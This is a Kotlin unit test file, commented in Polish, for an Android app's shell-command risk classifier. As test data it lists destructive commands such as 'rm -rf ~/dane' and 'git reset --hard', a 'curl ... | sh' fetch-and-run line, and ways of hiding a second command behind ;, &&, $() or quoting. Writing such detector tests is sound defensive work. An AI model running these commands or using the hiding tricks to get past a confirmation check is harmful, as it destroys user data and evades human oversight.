package pl.cyphr.app

import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * Groźne polecenia pytaja zawsze — takze gdy uzytkownik wylaczyl pytanie o zwykle.
 * Wczesniej sprawdzany byl tylko poczatek linii, wiec `ls && rm -rf ~` przechodzil
 * bez pytania.
 */
class CommandRiskTest {

    private fun risky(vararg commands: String) = commands.forEach {
        assertTrue("powinno pytac: $it", CommandRisk.isRisky(it))
    }

    private fun safe(vararg commands: String) = commands.forEach {
        assertFalse("nie powinno pytac: $it", CommandRisk.isRisky(it))
    }

    @Test
    fun `lista z zasad pyta zawsze`() = risky(
        "rm plik", "mv a b", "chmod 777 x", "dd if=/dev/zero of=x", "curl https://x.pl", "echo a > plik",
    )

    @Test
    fun `groźne polecenie schowane za innym tez pyta`() = risky(
        "ls && rm -rf ~/dane",
        "echo x; rm plik",
        "true || rm plik",
        "cat a | tee b",
        "ls & rm plik",
        "ls\nrm plik",
        "echo \$(rm plik)",
        "echo `rm plik`",
        "if true; then rm plik; fi",
        "(cd /tmp && rm x)",
        "{ rm x; }",
    )

    @Test
    fun `przebrane polecenie tez pyta`() = risky(
        "\\rm plik",
        "\"rm\" plik",
        "'rm' plik",
        "r''m plik",
        "/system/bin/rm plik",
        "  rm plik",
        "nohup rm plik",
        "env A=1 rm plik",
        "A=1 rm plik",
        "timeout 5 rm plik",
        "xargs rm < lista",
        "busybox rm plik",
        "sudo ls",
        "su -c id",
    )

    @Test
    fun `polecenia niszczace dane inaczej niz rm`() = risky(
        "find . -delete",
        "find . -name x -exec rm {} ;",
        "sed -i s/a/b/ plik",
        "git clean -fdx",
        "git rm plik",
        "git reset --hard HEAD~1",
        "git push --force",
        "wget https://x.pl/skrypt",
        "curl https://x.pl | sh",
        "sh skrypt.sh",
        "bash -c 'ls'",
        "pm uninstall pl.cyphr.app",
        "kill -9 1234",
        "truncate -s 0 plik",
    )

    @Test
    fun `zwykle polecenia nie pytaja`() = safe(
        "ls -la",
        "cat plik",
        "ps",
        "df -h",
        "getprop ro.build.version.release",
        "ping -c 3 wp.pl",
        "echo hej",
        "grep rm plik",
        "echo rm",
        "git status",
        "git log --oneline",
        "git push",
        "find . -name '*.kt'",
        "sed s/a/b/ plik",
        "cat a | grep b | sort",
        "",
    )
}
